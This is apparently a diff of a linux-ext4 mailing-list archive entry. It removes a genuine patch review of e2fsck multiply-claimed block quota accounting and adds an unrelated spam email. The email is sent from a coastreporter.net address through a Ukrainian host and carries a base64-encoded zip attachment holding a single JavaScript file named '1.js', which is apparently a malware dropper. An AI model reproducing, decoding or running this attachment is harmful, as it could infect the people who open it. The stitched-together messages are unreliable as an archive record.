@@ -1,106 +1,68 @@
-From: Andreas Dilger <adilger@dilger.ca>
-Subject: Re: [PATCH] e2fsck: fix multiply-claimed block quota accounting when
- deleting files
-Date: Wed, 10 May 2017 17:05:51 -0600
-Message-ID: <6A0785D3-A3D1-45F7-AD67-3C52D7364551@dilger.ca>
-References: <20170510220440.GA26875@localhost.localdomain>
-Mime-Version: 1.0 (Mac OS X Mail 10.3 \(3273\))
-Content-Type: multipart/signed;
- boundary="Apple-Mail=_1D0BFE6A-9F94-48C8-A2DD-2CA6C960DB70";
- protocol="application/pgp-signature"; micalg=pgp-sha1
-Cc: linux-ext4@vger.kernel.org, tytso@mit.edu
-To: Eric Whitney <enwlinux@gmail.com>
+From: <editor@coastreporter.net>
+Subject: 53858
+Date: Thu, 11 May 2017 04:27:46 -0000
+Message-ID: <149447686642.26770.2490032086375202040@centr.zp.ua>
+Mime-Version: 1.0
+Content-Type: application/zip; name="8114547974377.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
 Return-path: <linux-ext4-owner@vger.kernel.org>
-Received: from mail-it0-f67.google.com ([209.85.214.67]:33879 "EHLO
-        mail-it0-f67.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751820AbdEJXF5 (ORCPT
-        <rfc822;linux-ext4@vger.kernel.org>); Wed, 10 May 2017 19:05:57 -0400
-Received: by mail-it0-f67.google.com with SMTP id c26so1640842itd.1
-        for <linux-ext4@vger.kernel.org>; Wed, 10 May 2017 16:05:56 -0700 (PDT)
-In-Reply-To: <20170510220440.GA26875@localhost.localdomain>
+Received: from 91-219-54-6.centr.zp.ua ([91.219.54.6]:56921 "HELO centr.zp.ua"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751028AbdEKE1v (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
+        Thu, 11 May 2017 00:27:51 -0400
+Content-Disposition: attachment
 Sender: linux-ext4-owner@vger.kernel.org
 List-ID: <linux-ext4.vger.kernel.org>
 
-
---Apple-Mail=_1D0BFE6A-9F94-48C8-A2DD-2CA6C960DB70
-Content-Transfer-Encoding: 7bit
-Content-Type: text/plain;
-	charset=us-ascii
-
-
-> On May 10, 2017, at 4:04 PM, Eric Whitney <enwlinux@gmail.com> wrote:
-> 
-> As e2fsck processes each file in pass1, the actual file system quota is
-> increased by the number of blocks discovered in the file.  This can
-> include both non-multiply-claimed and multiply-claimed blocks, if the
-> latter exist.  However, if a file containing multiply-claimed blocks
-> is then deleted in pass1b, those blocks are not taken into account when
-> decreasing the actual quota.  In this case, the new quota values written
-> to the file system by e2fsck overstate the space actually consumed.
-> And, e2fsck must be run twice on the file system to fully correct
-> quota.
-> 
-> Fix this by counting multiply-claimed blocks as a debit to quota when
-> deleting files in pass1b.
-
-Nice catch.  It would be good to have an e2fsck test case that checks this.
-Also, one minor code style nit (or possibly defect) below.
-
-> Signed-off-by: Eric Whitney <enwlinux@gmail.com>
-> ---
-> e2fsck/pass1b.c | 10 ++++++----
-> 1 file changed, 6 insertions(+), 4 deletions(-)
-> 
-> diff --git a/e2fsck/pass1b.c b/e2fsck/pass1b.c
-> index b40f026..8744fad 100644
-> --- a/e2fsck/pass1b.c
-> +++ b/e2fsck/pass1b.c
-> @@ -636,11 +636,13 @@ static int delete_file_block(ext2_filsys fs,
-> 	lc = EXT2FS_B2C(fs, blockcnt);
-> 	if (ext2fs_test_block_bitmap2(ctx->block_dup_map, *block_nr)) {
-> 		n = dict_lookup(&clstr_dict, INT_TO_VOIDPTR(c));
-> -		if (n) {
-> -			p = (struct dup_cluster *) dnode_get(n);
-> -			if (lc != pb->cur_cluster)
-> 				decrement_badcount(ctx, *block_nr, p);
-> -		} else
-> +		if (n)
-> +			if (lc != pb->cur_cluster) {
-> +				p = (struct dup_cluster *) dnode_get(n);
-> 				decrement_badcount(ctx, *block_nr, p);
-> +				pb->dup_blocks++;
-> +			}
-> +		else
-> 			com_err("delete_file_block", 0,
-> 			    _("internal error: can't find dup_blk for %llu\n"),
-> 				*block_nr);
-
-This is tricky to know which "if" the "else" is for without the added braces,
-and to be honest I don't even know what the C standard says about this, which
-is likely why the braces were there in the first place.  I would instead
-recommend to add braces around the "else" clause to make it clear.
-
-Cheers, Andreas
-
-
-
-
-
-
---Apple-Mail=_1D0BFE6A-9F94-48C8-A2DD-2CA6C960DB70
-Content-Transfer-Encoding: 7bit
-Content-Disposition: attachment;
-	filename=signature.asc
-Content-Type: application/pgp-signature;
-	name=signature.asc
-Content-Description: Message signed with OpenPGP
-
------BEGIN PGP SIGNATURE-----
-Comment: GPGTools - http://gpgtools.org
-
-iD8DBQFZE5zQpIg59Q01vtYRAti+AJ4sz/aXwy8b+k2ty8RKynaEqkXx3ACbB8lv
-1hjQ9ody1uZ+WOMCdwxuvvw=
-=zKXQ
------END PGP SIGNATURE-----
-
---Apple-Mail=_1D0BFE6A-9F94-48C8-A2DD-2CA6C960DB70--
+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
